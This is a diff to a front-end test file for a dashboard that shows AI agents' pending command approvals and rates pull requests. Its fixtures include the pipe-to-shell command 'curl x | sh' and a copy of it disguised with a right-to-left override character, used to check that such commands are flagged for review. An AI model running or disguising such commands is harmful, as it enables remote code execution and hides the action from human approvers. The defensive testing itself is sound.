@@ -173,12 +173,14 @@ it("answers from a Needs you row, and the row opens the whole question in a dial
     note("menu", { kind: "choice", question: "Pick a plan" }),
     note("chain", { kind: "approval", tool: "Bash", detail: "git status && curl x | sh" }),
     note("long", { kind: "approval", tool: "Bash", detail: `git status${" ".repeat(80)}x` }),
-  ], rules: [], open: 5 } as never);
+    note("bidi", { kind: "approval", tool: "Bash", detail: "echo \u202Ehs.x | lruc" }),
+  ], rules: [], open: 6 } as never);
   vi.mocked(api.relayAnswer).mockResolvedValue({} as never);
   await show();
   const rows = within(screen.getByRole("article", { name: "Needs you" })).getAllByRole("listitem");
   expect(rows.map(row => [...row.querySelectorAll(".rd-home-mini")].map(b => b.textContent))).toEqual([
-    ["Approve", "Deny", "Terminal"], ["30 minutes", "On idle", "+1 more", "Terminal"], ["Terminal"], ["Review", "Terminal"], ["Review", "Terminal"]]);
+    ["Approve", "Deny", "Terminal"], ["30 minutes", "On idle", "+1 more", "Terminal"], ["Terminal"], ["Review", "Terminal"], ["Review", "Terminal"], ["Review", "Terminal"]]);
+  expect(rows[0].querySelector(".rd-home-need-q")).toHaveClass("cmd");
   await act(async () => { fireEvent.click(within(rows[0]).getByRole("button", { name: "Approve" })); });
   expect(api.relayAnswer).toHaveBeenCalledWith("dev", "approve");
   fireEvent.click(within(rows[1]).getByRole("button", { name: "+1 more" }));
@@ -205,6 +207,12 @@ it("rates a pull request Safe only with green CI, no conflict and nothing but sk
 
 it.each([
   ["docs/guide.md", "docs", true],
+  ["README.md", "docs", true],
+  ["docs/specs/terminology.md", "docs", false],
+  ["AGENTS.override.md", "docs", false],
+  ["CLAUDE.local.md", "docs", false],
+  ["kits/x/agents/reviewer.md", "docs", false],
+  ["docs/.claude/x.md", "docs", false],
   ["logo.png", "binary", true],
   ["package.json", "version-bump", true],
   ["AGENTS.md", "docs", false],
